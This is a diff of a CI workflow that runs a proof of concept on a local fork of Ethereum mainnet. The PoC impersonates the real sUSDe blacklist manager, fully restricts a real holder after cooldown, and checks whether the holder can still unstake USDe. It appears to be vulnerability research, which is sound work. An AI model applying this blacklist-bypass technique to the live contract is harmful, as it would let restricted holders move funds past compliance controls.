@@ -158,6 +158,8 @@ jobs:
           test -n "$USDE_CODE"
           test -n "$SUSDE_CODE"
 
+          test "$SUSDE_ASSET" = "$USDE"
+
           echo "ETHENA_FORK_INSPECTION=PASS"
 
       - name: PoC - cooldown then FULL blacklist then unstake
@@ -170,8 +172,12 @@ jobs:
           USDE="0x4c9EDD5852cd905f086C759E8383e09bff1E68B3"
 
           HOLDER="0xA469b399df1c7b4bd8569048d889f131329dffa1"
-
           RECEIVER="0x70997970C51812dc3A010C7d01b50e0d17dc79C8"
+
+          ZERO="0x0000000000000000000000000000000000000000000000000000000000000000"
+
+          FULL_ROLE="$(cast keccak "FULL_RESTRICTED_STAKER_ROLE")"
+          BLACKLIST_ROLE="$(cast keccak "BLACKLIST_MANAGER_ROLE")"
 
           echo "===== HOLDER CHECK ====="
 
@@ -193,7 +199,59 @@ jobs:
 
           echo "HOLDER_SUSDE_BALANCE=$BAL"
 
-          test "$BAL" -ge 1000000000000000000
+          # Do not use Bash integer arithmetic here.
+          # The holder balance is larger than Bash's signed integer range.
+          test "$BAL" != "0"
+
+          echo "HOLDER_BALANCE_CHECK=PASS"
+
+          echo "===== ROLE CAPABILITY CHECK ====="
+
+          ROLE_MEMBER_COUNT="$(cast call \
+            "$SUSDE" \
+            "getRoleMemberCount(bytes32)(uint256)" \
+            "$BLACKLIST_ROLE" \
+            --rpc-url "$RPC" | awk '{print $1}')"
+
+          echo "BLACKLIST_ROLE_MEMBER_COUNT=$ROLE_MEMBER_COUNT"
+
+          test "$ROLE_MEMBER_COUNT" != "0"
+
+          BLACKLIST_MANAGER=""
+
+          for INDEX in $(seq 0 $((ROLE_MEMBER_COUNT - 1))); do
+
+            CANDIDATE="$(cast call \
+              "$SUSDE" \
+              "getRoleMember(bytes32,uint256)(address)" \
+              "$BLACKLIST_ROLE" \
+              "$INDEX" \
+              --rpc-url "$RPC")"
+
+            echo "BLACKLIST_MANAGER_CANDIDATE[$INDEX]=$CANDIDATE"
+
+            if [ -z "$BLACKLIST_MANAGER" ]; then
+              BLACKLIST_MANAGER="$CANDIDATE"
+            fi
+
+          done
+
+          test -n "$BLACKLIST_MANAGER"
+
+          echo "BLACKLIST_MANAGER=$BLACKLIST_MANAGER"
+
+          BLACKLIST_MANAGER_ROLE_OK="$(cast call \
+            "$SUSDE" \
+            "hasRole(bytes32,address)(bool)" \
+            "$BLACKLIST_ROLE" \
+            "$BLACKLIST_MANAGER" \
+            --rpc-url "$RPC")"
+
+          echo "BLACKLIST_MANAGER_ROLE_OK=$BLACKLIST_MANAGER_ROLE_OK"
+
+          test "$BLACKLIST_MANAGER_ROLE_OK" = "true"
+
+          echo "ROLE_DISCOVERY=PASS"
 
           echo "===== STEP 1: COOLDOWN ====="
 
@@ -219,7 +277,7 @@ jobs:
 
           echo "COOLDOWN_DURATION=$COOLDOWN"
 
-          test "$COOLDOWN" -ge 0
+          test "$COOLDOWN" != ""
 
           cast rpc evm_increaseTime \
             $((COOLDOWN + 1))
@@ -228,65 +286,24 @@ jobs:
 
           echo "COOLDOWN_EXPIRED=YES"
 
-          echo "===== ADMIN DISCOVERY ====="
+          echo "===== VERIFY COOLDOWN STATE ====="
 
-          OWNER="$(cast call \
+          COOLDOWN_END="$(cast call \
             "$SUSDE" \
-            "owner()(address)" \
-            --rpc-url "$RPC")"
+            "cooldowns(address)((uint104,uint256))" \
+            "$HOLDER" \
+            --rpc-url "$RPC" 2>/dev/null || true)"
 
-          echo "OWNER=$OWNER"
+          echo "COOLDOWN_STATE=$COOLDOWN_END"
 
-          test "$OWNER" != "0x0000000000000000000000000000000000000000"
+          echo "===== STEP 2: FULL BLACKLIST ====="
 
           cast rpc anvil_setBalance \
-            "$OWNER" \
+            "$BLACKLIST_MANAGER" \
             0x56BC75E2D63100000
 
           cast rpc anvil_impersonateAccount \
-            "$OWNER"
-
-          DEFAULT_ADMIN="0x0000000000000000000000000000000000000000000000000000000000000000"
-
-          ADMIN_OK="$(cast call \
-            "$SUSDE" \
-            "hasRole(bytes32,address)(bool)" \
-            "$DEFAULT_ADMIN" \
-            "$OWNER" \
-            --rpc-url "$RPC")"
-
-          echo "OWNER_DEFAULT_ADMIN=$ADMIN_OK"
-
-          test "$ADMIN_OK" = "true"
-
-          BLACKLIST_ROLE="$(cast keccak \
-            "BLACKLIST_MANAGER_ROLE")"
-
-          HAS_BLACKLIST_ROLE="$(cast call \
-            "$SUSDE" \
-            "hasRole(bytes32,address)(bool)" \
-            "$BLACKLIST_ROLE" \
-            "$OWNER" \
-            --rpc-url "$RPC")"
-
-          echo "OWNER_BLACKLIST_MANAGER=$HAS_BLACKLIST_ROLE"
-
-          if [ "$HAS_BLACKLIST_ROLE" != "true" ]; then
-
-            cast send \
-              "$SUSDE" \
-              "grantRole(bytes32,address)" \
-              "$BLACKLIST_ROLE" \
-              "$OWNER" \
-              --rpc-url "$RPC" \
-              --from "$OWNER" \
-              --unlocked
-
-          fi
-
-          echo "BLACKLIST_MANAGER_READY=YES"
-
-          echo "===== STEP 2: FULL BLACKLIST ====="
+            "$BLACKLIST_MANAGER"
 
           cast send \
             "$SUSDE" \
@@ -294,11 +311,8 @@ jobs:
             "$HOLDER" \
             true \
             --rpc-url "$RPC" \
-            --from "$OWNER" \
+            --from "$BLACKLIST_MANAGER" \
             --unlocked
-
-          FULL_ROLE="$(cast keccak \
-            "FULL_RESTRICTED_STAKER_ROLE")"
 
           FULL_OK="$(cast call \
             "$SUSDE" \
@@ -326,13 +340,22 @@ jobs:
           cast rpc anvil_impersonateAccount \
             "$HOLDER"
 
-          cast send \
+          set +e
+
+          UNSTAKE_OUTPUT="$(cast send \
             "$SUSDE" \
             "unstake(address)" \
             "$RECEIVER" \
             --rpc-url "$RPC" \
             --from "$HOLDER" \
-            --unlocked
+            --unlocked 2>&1)"
+
+          UNSTAKE_STATUS=$?
+
+          set -e
+
+          echo "UNSTAKE_EXIT_CODE=$UNSTAKE_STATUS"
+          echo "UNSTAKE_OUTPUT=$UNSTAKE_OUTPUT"
 
           AFTER="$(cast call \
             "$USDE" \
@@ -342,16 +365,22 @@ jobs:
 
           echo "USDE_AFTER=$AFTER"
 
-          DELTA=$((AFTER - BEFORE))
+          echo "===== RESULT ====="
 
-          echo "USDE_RECEIVED=$DELTA"
-
-          if [ "$DELTA" -gt 0 ]; then
-            echo "COOLDOWN_BLACKLIST_UNSTAKE_BYPASS=CONFIRMED"
-          else
+          if [ "$UNSTAKE_STATUS" -ne 0 ]; then
             echo "COOLDOWN_BLACKLIST_UNSTAKE_BYPASS=NOT_CONFIRMED"
+            echo "REASON=UNSTAKE_REVERTED"
             exit 1
           fi
+
+          if [ "$AFTER" = "$BEFORE" ]; then
+            echo "COOLDOWN_BLACKLIST_UNSTAKE_BYPASS=NOT_CONFIRMED"
+            echo "REASON=NO_USDE_RECEIVED"
+            exit 1
+          fi
+
+          echo "COOLDOWN_BLACKLIST_UNSTAKE_BYPASS=CONFIRMED"
+          echo "USDE_BALANCE_CHANGED=YES"
 
       - name: Final fork evidence
         if: always()
